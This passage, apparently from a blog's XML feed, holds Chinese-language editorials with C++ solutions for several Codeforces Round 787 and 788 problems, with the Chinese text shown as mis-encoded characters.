class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Where-is-the-Pizza"><a href="#C-Where-is-the-Pizza" class="headerlink" title="C. Where is the Pizza?"></a>C. Where is the Pizza?</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é€‰æ‹©å…¶ä¸­ä¸€ä¸ªæ•°å¯¼è‡´äº†å¦ä¸€ä¸ªå¿…ç„¶ä¸é€‰ï¼Œæ‰€ä»¥è¿™é‡Œåˆè¦é€‰å¦ä¸€ä¸ªå¿…é€‰çš„æ•°ï¼Œç„¶åå¯¹äºæ¯ä¸ªç¯åªæœ‰ä¸¤ç§æ–¹æ¡ˆï¼Œæ‰¾åˆ°ç¯ä¸ªæ•°ç›¸ä¹˜aå’Œbç”¨æ•£åˆ—ä¿å­˜ä½ç½®ã€‚bæ•°ç»„å…¨éƒ¨æŒ‡å‘aã€‚aæ•°ç»„æŒ‡å‘ è‡ªå·±é‚£ä¸ªå€¼åœ¨ b ä¸­çš„ä½ç½®ã€‚æ¯æ¬¡åˆ¤æ–­ è¿™ä¸ªç¯ä¸­çš„ä½ç½®å¯¹åº”çš„ cæ˜¯å¦å…¨ä¸º0ã€‚æœ€åç‰¹åˆ¤ä¸¤ä¸ªç›¸ç­‰çš„æ—¶å€™è¿™ä¸ªæƒ…å†µä¹Ÿä¸ ä¹˜2ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(pos);</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> x=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(!vis[x])&#123;</span><br><span class="line">            vis[x]=<span class="number">1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(b_[a[x]]);</span><br><span class="line">            q.<span class="built_in">push</span>(a_[b[x]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[x]==b[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        a_[a[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;b[i];</span><br><span class="line">        b_[b[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;c[i];    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">dfs</span>(i);</span><br><span class="line">            <span class="keyword">if</span>(res)&#123;</span><br><span class="line">                ans*=<span class="number">2</span>;</span><br><span class="line">                ans%=mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Very-Suspicious"><a href="#D-Very-Suspicious" class="headerlink" title="D. Very Suspicious"></a>D. Very Suspicious</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è®¡ç®—å‡ ä½•ï¼Œè‡ªå·±ç”»ä¸€ä¸‹ä¼šå‘ç°ï¼šä¸‰çº¿ç›¸äº¤å¾—åˆ°6ä¸ªï¼Œä¸¤çº¿ç›¸äº¤å¾—åˆ°2ä¸ªï¼Œçº¿åªæœ‰ä¸‰ç§æ–¹å‘ã€‚æ¯æ·»åŠ ä¸€æ¡çº¿å‡‘æˆä¸‰çº¿ç›¸äº¤ï¼Œæ–¹æ¡ˆæ•°+4ï¼Œä¸å…¶å®ƒä¸å¹³è¡Œçš„çº¿ç›¸äº¤ï¼Œæ¯å¤šä¸€ä¸ªæ–¹æ¡ˆæ•°+2ã€‚ç„¶åæ‰“ä¸€éè¡¨ï¼ŒæŠŠ <code>1e9</code> ä»¥å†…çš„ç­”æ¡ˆè·‘å‡ºæ¥æœ€åäºŒåˆ†å¯»æ‰¾ç­”æ¡ˆå³å¯ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> ans[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> d=<span class="built_in">lower_bound</span>(ans,ans+maxn,n)-ans;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">3</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(ans));</span><br><span class="line">    ans[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    ans[<span class="number">3</span>]=<span class="number">6</span>;</span><br><span class="line">    ans[<span class="number">4</span>]=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span>(;cnt&lt;=<span class="number">1e9</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> sel=i%<span class="number">3</span>;</span><br><span class="line">        cnt+=(num[(sel+<span class="number">1</span>)%<span class="number">3</span>]+num[(sel+<span class="number">2</span>)%<span class="number">3</span>]<span class="number">-2</span>)*<span class="number">2</span>;</span><br><span class="line">        cnt+=<span class="number">4</span>;</span><br><span class="line">        num[sel]++;</span><br><span class="line">        ans[i+<span class="number">1</span>]=cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ³¢ä¹Ÿæ˜¯ä¸Šå¤§åˆ†ï¼Œä¸Šäº†38åˆ†ï¼Œå¸Œæœ›å†æ¥å†å‰ï¼Œäº‰å–å¿«ç‚¹ä¸Šç´«ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 787(Div.3)é¢˜è§£</title>
      <link href="/2022/05/06/Codeforces%20Round%20787(Div.3)/"/>
      <url>/2022/05/06/Codeforces%20Round%20787(Div.3)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1675">Codeforces Round #787 (Div. 3)</a> é¢˜è§£æ¥äº†ã€‚</p><p>å®å†µåœ¨<a href="https://www.bilibili.com/video/bv1eF411j7Uz">è¿™é‡Œ</a></p><span id="more"></span><h2 id="A-Food-for-Animals"><a href="#A-Food-for-Animals" class="headerlink" title="A. Food for Animals"></a>A. Food for Animals</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ çŒ«ç²®ï¼Œç‹—ç²®å’ŒçŒ«å’Œç‹—éƒ½èƒ½åƒçš„ç²®çš„ä¸ªæ•°ï¼Œå†ç»™ä½ çŒ«ç‹—çš„ä¸ªæ•°ï¼Œé—®èƒ½å¦ä½¿å¾—çŒ«ç‹—éƒ½æœ‰ä¸€ä»½ç²®é£Ÿèƒ½åƒã€‚è¿™é‡Œæˆ‘æ“ä¹‹è¿‡æ€¥ï¼Œå¯¼è‡´WAäº†ä¸€å‘ï¼Œè¡€äºã€‚å°±æ˜¯è¯´ä½ å¯ä»¥å…ˆåˆ¤æ–­ç‹—ç²®æ˜¯å¦å¤Ÿï¼Œå¦‚æœä¸å¤Ÿåˆ™é€šç”¨ç²®é£Ÿå‡å»å‰©ä½™çš„æ•°ç›®ï¼Œç„¶ååœ¨åˆ¤æ–­é€šç”¨ç²®é£Ÿå’ŒçŒ«ç²®æ˜¯å¦å¤§äºç­‰äºçŒ«çš„ä¸ªæ•°å°±è¡Œäº†ï¼Œä½†æ˜¯éå¸¸è¦æ³¨æ„ï¼Œé€šç”¨ç²®é£Ÿçš„ä¸ªæ•°ä¸èƒ½å‡ºç°è´Ÿæ•°ï¼Œå› ä¸ºè¿™é‡Œæ²¡åˆ¤æ–­waäº†ä¸€å‘ï¼Œå¾ˆéš¾ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">5</span>];</span><br><span class="line">    cin&gt;&gt;num[<span class="number">1</span>]&gt;&gt;num[<span class="number">2</span>]&gt;&gt;num[<span class="number">3</span>]&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    num[<span class="number">3</span>]-=<span class="built_in">max</span>(<span class="number">0</span>,x-num[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(num[<span class="number">3</span>]&lt;<span class="number">0</span>)<span class="function">NO</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">if</span><span class="params">(num[<span class="number">2</span>]+num[<span class="number">3</span>]&gt;=y)</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Make-It-Increasing"><a href="#B-Make-It-Increasing" class="headerlink" title="B. Make It Increasing"></a>B. Make It Increasing</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ ä¸€ä¸ªæ•°ç»„ï¼Œä¸€æ¬¡æ“ä½œå¯ä»¥è®©å®ƒæ•´é™¤2ï¼Œé—®æœ€åèƒ½é€šè¿‡æœ€å°‘å¤šå°‘æ¬¡æ“ä½œè®©åºåˆ—ä¸¥æ ¼é€’å¢ã€‚å› ä¸ºæ“ä½œåªä¼šä½¿å¾—æ•°å­—å˜å°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾å¾—åˆ°ï¼Œå¦‚æœè¦è®©å®ƒæ“ä½œæ¬¡æ•°æœ€å°ï¼Œæœ€åä¸€ä¸ªæ•°ä¸èƒ½åŠ¨ã€‚ç„¶åä¾æ¬¡å¾€å‰ï¼Œå¦‚æœå‰é¢çš„æ¯”åé¢çš„å¤§é‚£å°±è¿›è¡Œä¸€æ¬¡æ“ä½œï¼Œç›´åˆ° <code>a[i]&lt;a[i-1]||a[i]==0</code> å› ä¸ºåˆ°0äº†æ•´é™¤å°±ä¸ä¼šå˜äº†ï¼Œå› æ­¤è¿™ä¸ªæ¡ä»¶éœ€è¦åŠ ä¸Šå»ã€‚</p><p>æœ€ååªéœ€è¦åˆ¤æ–­ç¬¬ä¸€ä¸ªæ•°å’Œç¬¬äºŒä¸ªæ•°æ˜¯å¦éƒ½ä¸º0å³å¯ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i]&gt;=a[i+<span class="number">1</span>]&amp;&amp;a[i])&#123;</span><br><span class="line">            a[i]/=<span class="number">2</span>;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">1</span>]==<span class="number">0</span>&amp;&amp;a[<span class="number">2</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);    </span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span 